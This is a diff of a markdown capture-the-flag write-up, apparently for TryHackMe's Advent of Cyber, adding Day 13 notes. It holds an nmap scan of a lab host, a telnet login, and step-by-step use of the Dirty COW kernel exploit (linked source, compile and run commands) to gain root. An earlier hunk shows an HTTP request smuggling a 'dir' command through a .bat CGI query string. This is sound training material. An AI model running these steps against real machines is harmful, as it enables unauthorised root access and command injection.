@@ -768,19 +768,12 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 GET /cgi-bin/elfwhacker.bat?&dir HTTP/1.1
 
 Host: 10.10.72.67:8080
-
 Cache-Control: max-age=0
-
 Upgrade-Insecure-Requests: 1
-
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
-
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-
 Accept-Encoding: gzip, deflate
-
 Accept-Language: en-US,en;q=0.9,ca;q=0.8
-
 Connection: close
 ```
 * We can press `CTRL+R` to send to the repeater tab
@@ -792,6 +785,51 @@ Connection: close
 
 
 # Day 13
+### IP
+`10.10.240.97`
+
+### nmap
+`nmap -sC -sV 10.10.240.97 -oN initial.nmap`
+```
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-23 12:03 EST
+Nmap scan report for 10.10.240.97
+Host is up (0.13s latency).
+Not shown: 997 closed ports
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 68:60:de:c2:2b:c6:16:d8:5b:88:be:e3:cc:a1:25:75 (DSA)
+|   2048 50:db:75:ba:11:2f:43:c9:ab:14:40:6d:7f:a1:ee:e3 (RSA)
+|_  256 11:5d:55:29:8a:77:d8:08:b4:00:9b:a3:61:93:fe:e5 (ECDSA)
+23/tcp  open  telnet  Linux telnetd
+111/tcp open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          33238/udp   status
+|   100024  1          38310/tcp6  status
+|   100024  1          51693/tcp   status
+|_  100024  1          60126/udp6  status
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.98 seconds
+```
+* The machine is running telnet, which is [not secure](https://www.geeksforgeeks.org/difference-ssh-telnet/#:~:text=Telnet%20is%20not%20a%20secure,to%20get%20that%20important%20information.)
+
+### telnet
+* We can login with `telnet 10.10.173.218` and with the credentials that are printed for us
+
+### dirty cow
+* running `cat /etc/*release` shows us that the machine is running Ubtunu 12.04, which is vulnerable to dirty cow
+* We can download the exploit from [here](https://github.com/FireFart/dirtycow/blob/master/dirty.c) and compile it with `gcc -pthread dirty.c -o dirty -lcrypt` as described in the comments
+* Make the file executable with `chmod +x dirty` and run with `./dirty`
+	* Once this is done, you might have to telnet in again (I did), but now you can log in with the user `firefart` and with the password that you set by typing `su firefart`
+* Now we can `cd /root/`, `touch coal` (as per the instructions) and `tree | md5sum` to get the hash `8b16f00dd3b51efadb02c1df7f8427cc`
+
 
 # Day 14
 
